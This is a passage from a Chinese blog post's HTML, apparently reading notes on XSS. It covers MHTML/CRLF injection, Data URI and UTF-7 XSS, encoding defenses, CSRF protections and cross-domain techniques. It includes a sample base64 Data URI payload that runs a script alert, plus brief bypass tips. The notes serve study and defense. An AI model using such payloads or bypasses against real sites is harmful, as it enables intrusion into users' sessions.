boundary=&quot;----=_NextPart_000_0000_01D3F8CD.55309DF0&quot;           定义boundary</span><br><span class="line">X-MimeOLE: Produced By Microsoft MimeOLE V6.1.7601.17609</span><br><span class="line"></span><br><span class="line">这是 MIME 格式的多方邮件。</span><br><span class="line"></span><br><span class="line">------=_NextPart_000_0000_01D3F8CD.55309DF0                        开始处boundary</span><br><span class="line">Content-Type: text/html;</span><br><span class="line">	charset=&quot;utf-8&quot;</span><br><span class="line">Content-Transfer-Encoding: quoted-printable                           指出编码方式</span><br><span class="line">Content-Location: https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;tn=90671454_hao_pg&amp;wd=mhtml%E5%8C%85%E6%A0%BC%E5%BC%8F&amp;oq=mhtml&amp;rsv_pq=ecc74df00001108d&amp;rsv_t=dc7bIaOr7SyEROT%2BPj5JJihP0NceQ3KgzwrbA%2BtIFqN4QjKzKq2JZG4up20rscGvNZg07M8W&amp;rqlang=cn&amp;rsv_enter=1&amp;inputT=7983&amp;rsv_sug3=21&amp;rsv_sug1=15&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;rsv_sug4=8880</span><br><span class="line">&lt;META http-equiv=3D&quot;content-type&quot; content=3D&quot;text/html;charset=3Dutf-8&quot;&gt;	=</span><br><span class="line">	=20</span><br><span class="line">……</span><br><span class="line">ypeof define&amp;&amp;define.amd&amp;&amp;define(&quot;jquery&quot;,[],function()&#123;return ct=0A=&#125;))&#125;(window);</span><br><span class="line">------=_NextPart_000_0000_01D3F8CD.55309DF0--                        结束boundary</span><br></pre></td></tr></table></figure></p>
+<p>真正访问的话，url的头部需要加入 mhtml：，尾部需要加上 ！文件名<br>攻击手法的话，用CRLF可以直接在url里面操作相当于注入数据包吧，把mhtml格式的东西写进去，js恶意代码记得用自己规定的编码方式去编码<br>防御很简单：参数长度限制， 还有CRLF的字符过滤</p>
+<h3 id="利用Data-URIs-进行XSS剖析"><a href="#利用Data-URIs-进行XSS剖析" class="headerlink" title="利用Data URIs 进行XSS剖析"></a>利用Data URIs 进行XSS剖析</h3><p>与MHTML类似，但实际上是解决了将小文件嵌入到网页之中，和mhtml一样有着固定的格式，因此XSS也是要编码后放进去的（默认base64）例子如下<br>&lt;a href=”data:text/html;base64,Jmx0O3NjcmlwdCZndDthbGVydCgiWFNTIikmbHQ7L3NjcmlwdCZndDs=”&gt;test&lt;/a&gt;<br>关于普通超链接和data uris 区别，以下为摘取自博客<br><a href="https://blog.csdn.net/daruisoft/article/details/19773181" target="_blank" rel="noopener">https://blog.csdn.net/daruisoft/article/details/19773181</a><br>当我们需要减少访问网页产生的请求数时，Data URIs技术理应成为备选之举。<br>事物总是两面的，Data URIs能减少请求、减少小文件所消耗的带宽（不用再额外发送http头）；但是，我们也不能忽略Data URIs可能造成的缓存问题和编码时资源消耗的问题。</p>
+<h3 id="UTF-7-BOM-XSS"><a href="#UTF-7-BOM-XSS" class="headerlink" title="UTF-7 BOM XSS"></a>UTF-7 BOM XSS</h3><p>利用的应该是前几章说过的用编码进行绕过，那么这里利用utf-7是因为IE是根据BOM判断编码字符集，而我们可以进行改动来控制其判断。</p>
+<h3 id="浏览器插件问题（大概就是因为flash、pdf支持js的原因吧）"><a href="#浏览器插件问题（大概就是因为flash、pdf支持js的原因吧）" class="headerlink" title="浏览器插件问题（大概就是因为flash、pdf支持js的原因吧）"></a>浏览器插件问题（大概就是因为flash、pdf支持js的原因吧）</h3><h3 id="几个特殊场景"><a href="#几个特殊场景" class="headerlink" title="几个特殊场景"></a>几个特殊场景</h3><p>有谷歌把cookie显示出来的，有利用RSS中的XSS的，还有应用软件中的</p>
+<h3 id="浏览器差异"><a href="#浏览器差异" class="headerlink" title="浏览器差异"></a>浏览器差异</h3><p>差异太多 记不住 无能为力</p>
+<h3 id="字符集编码隐患"><a href="#字符集编码隐患" class="headerlink" title="字符集编码隐患"></a>字符集编码隐患</h3><p>这似乎和sqli里宽字节注入挺像的，宽字节可以绕过一些个转义的过滤</p>
+<h2 id="防御XSS攻击"><a href="#防御XSS攻击" class="headerlink" title="防御XSS攻击"></a>防御XSS攻击</h2><h3 id="XSS-Filter"><a href="#XSS-Filter" class="headerlink" title="XSS Filter"></a>XSS Filter</h3><p>过滤输入输出、输出进行适当编码、黑名单和白名单</p>
+<h3 id="定制过滤策略"><a href="#定制过滤策略" class="headerlink" title="定制过滤策略"></a>定制过滤策略</h3><p>这里其实总结精练了一些绕过方法，有些后悔读了一半就开始写读书笔记了。具体讲啥 应该就是不知攻焉知防的道理？</p>
+<h3 id="Web安全编码规范"><a href="#Web安全编码规范" class="headerlink" title="Web安全编码规范"></a>Web安全编码规范</h3><p>Html文本中使用html编码为好，js代码段使用转义来进行处理比较好，Url中还是url编码比较合适。</p>
+<h3 id="防御DOM-Based-XSS"><a href="#防御DOM-Based-XSS" class="headerlink" title="防御DOM-Based XSS"></a>防御DOM-Based XSS</h3><p>一方面是避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务端使用动态页面来实现<br>另一方面就是强化客户端js代码</p>
+<h3 id="其他防御方式"><a href="#其他防御方式" class="headerlink" title="其他防御方式"></a>其他防御方式</h3><ul>
+<li>Anti_XSS库</li>
+<li>HttpOnly Cokkie</li>
+<li>Noscript 火狐一插件</li>
+<li>上WAF<h3 id="防御CSRF攻击"><a href="#防御CSRF攻击" class="headerlink" title="防御CSRF攻击"></a>防御CSRF攻击</h3></li>
+<li>使用POST替代GET（只能增加利用难度或者是发现难度）</li>
+<li>检验HTTP Referer</li>
+<li>验证码</li>
+<li>使用Token，本书讨论了token放这放那的问题，最后总结一次性Token最有效。<h3 id="四两拨千斤：HttpOnly"><a href="#四两拨千斤：HttpOnly" class="headerlink" title="四两拨千斤：HttpOnly"></a>四两拨千斤：HttpOnly</h3>为cookie的某一项 或者几项 或者全部 设置HttpOnly使得js代码无法读取指定cookie值</li>
+</ul>
+<h3 id="输入输出时进行检查，编码输出"><a href="#输入输出时进行检查，编码输出" class="headerlink" title="输入输出时进行检查，编码输出"></a>输入输出时进行检查，编码输出</h3><p>注意要在正确的地方使用正确的编码方式<br>如html encode，如果用户输入为html encode格式，在浏览器中html parser优先于js parser执行，因此先html解析再js代码执行，这个时候用户的输入在js运行前 已经被解析回js代码，所以一开始用户可以构造好parload再html编码之后进行攻击</p>
+<h3 id="正确防御XSS"><a href="#正确防御XSS" class="headerlink" title="正确防御XSS"></a>正确防御XSS</h3><p>要想要根治XSS，可以列出所有XSS可能发生的场景（用户输入出现的位置），再一一解决</p>
+<ul>
+<li><p>在HTML标签中输出</p>
+<pre><code>攻击方式是构造&amp;lt;script&gt;标签或者任何能够产生脚本执行的方式
+防御方法是对变量使用HtmlEncode
+</code></pre></li>
+<li><p>在HTML属性中输出</p>
+<pre><code>利用和防御方法同上
+</code></pre></li>
+<li><p>在&lt;script&gt;标签中输出</p>
+<pre><code>攻击者需要注意闭合单、双引号
+防御使用JavascriptEncode
+</code></pre></li>
+<li><p>在CSS中输出</p>
+<pre><code>一般来说这样是禁止的，但是如果需要，推荐使用OWASP ESAPI中的encodeForCss（）函数
+例：String safe=ESAPI.encoder().encoderForCSS(request.getParameter(&quot;input&quot;));
+其实现原理类似于ESAPI.encoder().encodeForJavaScript()函数，除了字母、数字外的所有字符都被编码成十六进制性时&quot;\uHH&quot;
+【ESAPI (OWASP企业安全应用程序接口)是一个免费、开源的、网页应用程序安全控件库，它使程序员能够更容易写出更低风险的程序。ESAPI接口库被设计来使程序员能够更容易的在现有的程序中引入安全因素。ESAPI库也可以成为作为新程序开发的基础。】
+</code></pre></li>
+<li><p>在地址中输出</p>
+<pre><code>一般来说，在URL的path（路径）或者search（参数）中输出，使用URLEncode即可
+但urlencode不要用在Protocol（协议）和Host（域名或主机名）部分，会改变语义
+攻击者就可以使用伪协议，如javascript、vbscript、dataURI等
+防御即为检查uri开头是否为http，不是则进行urlencode
+OWASP ESAPI中有encodeForURL（）函数，例：
+String safe=ESAPI.encoder().encoderForURL(request.getParameter(&quot;input&quot;));
+</code></pre></li>
+<li><p>DOM Based XSS的防御</p>
+<pre><code>一般只会注意到在&amp;lt;script&gt;标签中输出必须过滤（编码）一次的情况，但是也要注意往往在使用document.write()等将内容输出到html页面的方法前，需要针对前几种情况做出对应的编码，防止在这一输出过程中输出XSS代码
+</code></pre></li>
+</ul>
+<h2 id="五种客户端跨域方法："><a href="#五种客户端跨域方法：" class="headerlink" title="五种客户端跨域方法："></a>五种客户端跨域方法：</h2><h3 id="JSONP-json-with-padding"><a href="#JSONP-json-with-padding" class="headerlink" title="JSONP(json with padding)"></a>JSONP(json with padding)</h3><p>用callback参数传递数据，请求的相应页面也要有相关的响应数据</p>
+<h3 id="document-domain"><a href="#document-domain" class="headerlink" title="document.domain"></a>document.domain</h3><p>其会显示当前域名，也可以人为设置，但只能设置成当前域名或者顶级域名。设置成相同域名即可进行原本不同域页面的操作了，也就是可以跨域读取之类了</p>
+<h3 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h3><p>无论页面内容怎么跳转，windows.name是不变的，所以用于在跨域时承载数据，一般用来缩短xss的payload。想要跨域访问元素可以直接改变相应元素的src属性使得看起来是一个域，然后运行window.name里面的payload</p>
+<h3 id="postMessage"><a href="#postMessage" class="headerlink" title="postMessage"></a>postMessage</h3><p>是HTML5时代新出现的api，发送方通过postMessage方法传递自定义消息给指定接收的域；接收方通过事件监听可以获取传过来的消息</p>
+<h3 id="browser-SOP-bug"><a href="#browser-SOP-bug" class="headerlink" title="browser SOP bug"></a>browser SOP bug</h3><p>即各种浏览器解析sop(Same-Origin Policy)同源协议时出现的漏洞</p>
+<h2 id="三种服务器跨域方法"><a href="#三种服务器跨域方法" class="headerlink" title="三种服务器跨域方法"></a>三种服务器跨域方法</h2><h3 id="反代服务器"><a href="#反代服务器" class="headerlink" title="反代服务器"></a>反代服务器</h3><p>即将其他域名的资源映射到自己的域名之下，这样浏览器就认为他们是同源的</p>
+<h3 id="CORS（Cross-origin-resource-sharing）"><a href="#CORS（Cross-origin-resource-sharing）" class="headerlink" title="CORS（Cross-origin resource sharing）"></a>CORS（Cross-origin resource sharing）</h3><p>跨域资源共享，发送端通过发送带有头信息Origin字段的请求来获取服务端资源，如果许可，返回带有Access-Control-Allow-Origin等字段的回应，不被许可则返回错误。和websocket很像（发送时都带有origin字段用于服务器判断是否可跨域，但具体发送的字段和获取到的字段有差），信安之路之前的文章里面 作者晚风说和jsonp很像，只是多了个类似白名单的东西在控制</p>
+<h3 id="Flash"><a href="#Flash" class="headerlink" title="Flash"></a>Flash</h3><p>与flash相关配置有关</p>
+<h2 id="其他高端技巧"><a href="#其他高端技巧" class="headerlink" title="其他高端技巧"></a>其他高端技巧</h2><p><a href="https://portswigger.net/blog/xss-without-parentheses-and-semi-colons" target="_blank" rel="noopener">xss-without-parentheses-and-semi-colons</a><br><a href="http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=2649718367&amp;idx=2&amp;sn=72ba6e143dc0ca6f9d3db0579e23193e&amp;chksm=888c4e30bffbc726561cf6649978ba08cad6f69bab81d1c16c808c3020b2c5f00af625206ef7&amp;scene=0&amp;xtrack=1#rd" target="_blank" rel="noopener">无需括号与分号的XSS</a><br><a href="https://mp.weixin.qq.com/s/xBtFUSMfFggL0KlK8eQkKA" target="_blank" rel="noopener">绕过WAF的XSS检测机制</a><br><a href="https://mp.weixin.qq.com/s/oVoSlXR_TJOYWA6CdBvMWQ" target="_blank" rel="noopener">Xss小游戏通关秘籍</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src>
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://link.hhtjim.com/163/514216257.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="https://link.hhtjim.com/163/514213582.mp3"></li>
+                        
+                    
+                        
+                            <li title="2" data-url="https://link.hhtjim.com/163/514216237.mp3"></li>
+                        
+                    
+                        
+                            <li title="3" data-url="https://link.hhtjim.com/163/36664350.mp3"></li>
+                        
+                    
+                        
+                            <li title="4" data-url="https://link.hhtjim.com/163/401722197.mp3"></li>
+                        
+                    
+                        
+                            <li title="5" data-url="https://link.hhtjim.com/163/34228815.mp3"></li>
+                        
+                    
+                        
+                            <li title="6" data-url="https://link.hhtjim.com/163/401723178.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-enable="false" data-ae="false" data-ci data-cs data-r data-o data-a data-d="false">View Comments</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS初探"><span class="toc-number">1.</span> <span class="toc-text">XSS初探</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分类"><span class="toc-number">1.1.</span> <span class="toc-text">分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#测试XSS的代码"><span class="toc-number">1.2.</span> <span class="toc-text">测试XSS的代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#其他"><span class="toc-number">1.2.1.</span> <span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode构造与调用"><span class="toc-number">1.3.</span> <span class="toc-text">shellcode构造与调用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS利用方式"><span class="toc-number">2.</span> <span class="toc-text">XSS利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie的利用"><span class="toc-number">2.1.</span> <span class="toc-text">Cookie的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#进行会话劫持"><span class="toc-number">2.2.</span> <span class="toc-text">进行会话劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网络钓鱼"><span class="toc-number">2.3.</span> <span class="toc-text">网络钓鱼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-history-back"><span class="toc-number">2.4.</span> <span class="toc-text">xss history back</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#客户端信息刺探"><span class="toc-number">2.5.</span> <span class="toc-text">客户端信息刺探</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他恶意攻击"><span class="toc-number">2.6.</span> <span class="toc-text">其他恶意攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS构造技巧"><span class="toc-number">3.</span> <span class="toc-text">XSS构造技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用字符编码"><span class="toc-number">3.1.</span> <span class="toc-text">利用字符编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过长度限制"><span class="toc-number">3.2.</span> <span class="toc-text">绕过长度限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用base标签"><span class="toc-number">3.3.</span> <span class="toc-text">使用base标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#window-name的妙用"><span class="toc-number">3.4.</span> <span class="toc-text">window.name的妙用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xss可以按照payload出现的位置进行分类"><span class="toc-number">3.5.</span> <span class="toc-text">Xss可以按照payload出现的位置进行分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#不同标签"><span class="toc-number">3.6.</span> <span class="toc-text">不同标签</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#发掘XSS漏洞"><span class="toc-number">4.</span> <span class="toc-text">发掘XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#源代码审计"><span class="toc-number">4.1.</span> <span class="toc-text">源代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-XSS"><span class="toc-number">4.2.</span> <span class="toc-text">DOM  XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flash-XSS"><span class="toc-number">4.3.</span> <span class="toc-text">Flash  XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#巧用语言特性"><span class="toc-number">4.4.</span> <span class="toc-text">巧用语言特性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-WORM"><span class="toc-number">5.</span> <span class="toc-text">XSS  WORM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ajax介绍"><span class="toc-number">5.1.</span> <span class="toc-text">Ajax介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#运用DOM技术"><span class="toc-number">5.2.</span> <span class="toc-text">运用DOM技术</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#深入XSS原理"><span class="toc-number">6.</span> <span class="toc-text">深入XSS原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#深入浅出CSRF（跨站请求伪造）"><span class="toc-number">6.1.</span> <span class="toc-text">深入浅出CSRF（跨站请求伪造）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hacking-JSON"><span class="toc-number">6.2.</span> <span class="toc-text">Hacking JSON</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-Response-Splitting"><span class="toc-number">6.3.</span> <span class="toc-text">HTTP Response Splitting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MHTML协议安全"><span class="toc-number">6.4.</span> <span class="toc-text">MHTML协议安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用Data-URIs-进行XSS剖析"><span class="toc-number">6.5.</span> <span class="toc-text">利用Data URIs 进行XSS剖析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UTF-7-BOM-XSS"><span class="toc-number">6.6.</span> <span class="toc-text">UTF-7 BOM XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#浏览器插件问题（大概就是因为flash、pdf支持js的原因吧）"><span class="toc-number">6.7.</span> <span class="toc-text">浏览器插件问题（大概就是因为flash、pdf支持js的原因吧）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#几个特殊场景"><span class="toc-number">6.8.</span> <span class="toc-text">几个特殊场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#浏览器差异"><span class="toc-number">6.9.</span> <span class="toc-text">浏览器差异</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符集编码隐患"><span class="toc-number">6.10.</span> <span class="toc-text">字符集编码隐患</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御XSS攻击"><span class="toc-number">7.</span> <span class="toc-text">防御XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-Filter"><span class="toc-number">7.1.</span> <span class="toc-text">XSS Filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#定制过滤策略"><span class="toc-number">7.2.</span> <span class="toc-text">定制过滤策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web安全编码规范"><span class="toc-number">7.3.</span> <span class="toc-text">Web安全编码规范</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御DOM-Based-XSS"><span class="toc-number">7.4.</span> <span class="toc-text">防御DOM-Based XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他防御方式"><span class="toc-number">7.5.</span> <span class="toc-text">其他防御方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御CSRF攻击"><span class="toc-number">7.6.</span> <span class="toc-text">防御CSRF攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四两拨千斤：HttpOnly"><span class="toc-number">7.7.</span> <span class="toc-text">四两拨千斤：HttpOnly</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#输入输出时进行检查，编码输出"><span class="toc-number">7.8.</span> <span class="toc-text">输入输出时进行检查，编码输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#正确防御XSS"><span class="toc-number">7.9.</span> <span class="toc-text">正确防御XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#五种客户端跨域方法："><span class="toc-number">8.</span> <span class="toc-text">五种客户端跨域方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JSONP-json-with-padding"><span class="toc-number">8.1.</span> <span class="toc-text">JSONP(json with padding)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#document-domain"><span class="toc-number">8.2.</span> <span class="toc-text">document.domain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#window-name"><span class="toc-number">8.3.</span> <span class="toc-text">window.name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#postMessage"><span class="toc-number">8.4.</span> <span class="toc-text">postMessage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#browser-SOP-bug"><span class="toc-number">8.5.</span> <span class="toc-text">browser SOP bug</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三种服务器跨域方法"><span class="toc-number">9.</span> <span class="toc-text">三种服务器跨域方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#反代服务器"><span class="toc-number">9.1.</span> <span class="toc-text">反代服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS（Cross-origin-resource-sharing）"><span class="toc-number">9.2.</span> <span class="toc-text">CORS（Cross-origin resource sharing）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flash"><span class="toc-number">9.3.</span> <span class="toc-text">Flash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他高端技巧"><span class="toc-number">10.</span> <span class="toc-text">其他高端技巧</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
